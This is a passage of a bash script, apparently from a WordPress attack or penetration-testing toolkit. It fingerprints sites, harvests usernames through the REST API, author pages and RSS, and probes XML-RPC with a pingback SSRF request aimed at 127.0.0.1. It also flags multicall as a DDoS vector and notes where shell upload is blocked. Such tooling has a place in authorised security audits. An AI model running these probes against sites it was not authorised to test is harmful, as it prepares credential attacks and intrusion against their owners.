    # Detect plugins
    local plugins=$(curl -sk --max-time 10 "https://${target}/" 2>/dev/null | grep -oP '/wp-content/plugins/\K[^/]+' | sort -u | head -10 | tr '\n' ' ')
    [ -n "$plugins" ] && echo "PLUGINS: $plugins" >> "$SESSION/bt/wp_fingerprint.txt"
    # Detect hosting type (self-hosted vs WordPress.com vs WP Engine)
    local headers=$(curl -skI --max-time 10 "https://${target}/" 2>/dev/null)
    echo "$headers" | grep -iE 'host-header|x-hacker|x-pingback|x-powered-by|server' >> "$SESSION/bt/wp_fingerprint.txt"
    # Check for WordPress.com specific indicators
    echo "$headers" | grep -q "WordPress.com" && echo "HOSTING: WordPress.com (managed — shell upload BLOCKED)" >> "$SESSION/bt/wp_fingerprint.txt"
    echo "$headers" | grep -q "WP Engine" && echo "HOSTING: WP Engine (managed)" >> "$SESSION/bt/wp_fingerprint.txt"
    # Check XML-RPC
    local xmlrpc=$(curl -skI --max-time 8 "https://${target}/xmlrpc.php" 2>/dev/null | head -1)
    [ -n "$xmlrpc" ] && echo "XML-RPC: $xmlrpc" >> "$SESSION/bt/wp_fingerprint.txt"
    # Check REST API
    local rest=$(curl -skI --max-time 8 "https://${target}/wp-json/" 2>/dev/null | head -1)
    [ -n "$rest" ] && echo "REST API: $rest" >> "$SESSION/bt/wp_fingerprint.txt"
    [ -s "$SESSION/bt/wp_fingerprint.txt" ] && bt "WordPress fingerprint complete" || info "WP fingerprint minimal"
}

bt_172_wp_user_enum() {
    local target="${1:-$TARGET}"
    _section "[BT-172] WORDPRESS USER ENUMERATION"
    run "Enumerating WordPress users via REST API, author pages, and RSS..."
    > "$SESSION/bt/wp_users.txt"
    # REST API user enumeration
    local users=$(curl -sk --max-time 10 "https://${target}/wp-json/wp/v2/users?per_page=100" 2>/dev/null)
    [ -n "$users" ] && [ "$users" != "[]" ] && {
        echo "=== REST API USERS ===" >> "$SESSION/bt/wp_users.txt"
        echo "$users" | grep -oP '"name":"[^"]*"|"slug":"[^"]*"|"id":[0-9]+' | head -30 >> "$SESSION/bt/wp_users.txt"
    }
    # Author page enumeration
    for i in $(seq 1 10); do
        local author=$(curl -skI --max-time 5 "https://${target}/?author=$i" 2>/dev/null | grep -i "location" | grep -oP 'author/\K[^/]+' | head -1)
        [ -n "$author" ] && echo "AUTHOR ID $i: $author" >> "$SESSION/bt/wp_users.txt"
    done
    # RSS feed user extraction
    local rss_users=$(curl -sk --max-time 10 "https://${target}/feed/" 2>/dev/null | grep -oP '<dc:creator><!\[CDATA\[\K[^\]]+' | sort -u | head -10)
    [ -n "$rss_users" ] && echo "" >> "$SESSION/bt/wp_users.txt" && echo "=== RSS AUTHORS ===" >> "$SESSION/bt/wp_users.txt" && echo "$rss_users" >> "$SESSION/bt/wp_users.txt"
    # JSON API via WordPress.com
    local wpcom_users=$(curl -sk --max-time 10 "https://public-api.wordpress.com/wp/v2/sites/${target}/users?per_page=10" 2>/dev/null)
    [ -n "$wpcom_users" ] && ! echo "$wpcom_users" | grep -q "unauthorized" && {
        echo "" >> "$SESSION/bt/wp_users.txt"
        echo "=== WPCOM API USERS ===" >> "$SESSION/bt/wp_users.txt"
        echo "$wpcom_users" | grep -oP '"name":"[^"]*"|"slug":"[^"]*"' | head -20 >> "$SESSION/bt/wp_users.txt"
    }
    [ -s "$SESSION/bt/wp_users.txt" ] && bt "WordPress users enumerated" || info "WP user enum minimal"
}

bt_173_wp_xmlrpc_assess() {
    local target="${1:-$TARGET}"
    _section "[BT-173] WORDPRESS XML-RPC SECURITY ASSESSMENT"
    run "Testing XML-RPC for enabled methods, pingback SSRF, and multicall DDoS..."
    > "$SESSION/bt/wp_xmlrpc.txt"
    # Check if XML-RPC is accessible
    local xmlrpc_resp=$(curl -sk --max-time 10 -X POST "https://${target}/xmlrpc.php" -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' 2>/dev/null)
    [ -n "$xmlrpc_resp" ] && {
        echo "=== XML-RPC ENABLED ===" >> "$SESSION/bt/wp_xmlrpc.txt"
        # Extract dangerous methods
        echo "$xmlrpc_resp" | grep -oE '<string>[^<]+</string>' | grep -vE 'system\.listMethods|system\.getCapabilities|system\.multicall' | head -30 >> "$SESSION/bt/wp_xmlrpc.txt"
        # Check for pingback.ping
        if echo "$xmlrpc_resp" | grep -q "pingback.ping"; then
            echo "" >> "$SESSION/bt/wp_xmlrpc.txt"
            echo "PINGBACK.PING: AVAILABLE (potential SSRF/DDoS vector)" >> "$SESSION/bt/wp_xmlrpc.txt"
            # Test pingback SSRF
            local pingback_test=$(curl -sk --max-time 10 -X POST "https://${target}/xmlrpc.php" -H "Content-Type: text/xml" -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://127.0.0.1:80/</string></value></param><param><value><string>https://${target}/</string></value></param></params></methodCall>" 2>/dev/null)
            [ -n "$pingback_test" ] && {
                if echo "$pingback_test" | grep -qi "fault\|error\|invalid"; then
                    echo "PINGBACK SSRF: BLOCKED (patched/WAF)" >> "$SESSION/bt/wp_xmlrpc.txt"
                else
                    echo "PINGBACK SSRF: POTENTIALLY VULNERABLE" >> "$SESSION/bt/wp_xmlrpc.txt"
                fi
            }
        fi
        # Check for system.multicall
        if echo "$xmlrpc_resp" | grep -q "system.multicall"; then
            echo "" >> "$SESSION/bt/wp_xmlrpc.txt"
            echo "SYSTEM.MULTICALL: AVAILABLE (DDoS amplification vector)" >> "$SESSION/bt/wp_xmlrpc.txt"
        fi
        # Check for metaWeblog methods
        if echo "$xmlrpc_resp" | grep -q "metaWeblog.newPost"; then
            echo "" >> "$SESSION/bt/wp_xmlrpc.txt"
            echo "METAWEBLOG: AVAILABLE (content posting if credentials available)" >> "$SESSION/bt/wp_xmlrpc.txt"
        fi
    }
    [ -s "$SESSION/bt/wp_xmlrpc.txt" ] && bt "XML-RPC assessment complete" || info "XML-RPC not available"
}

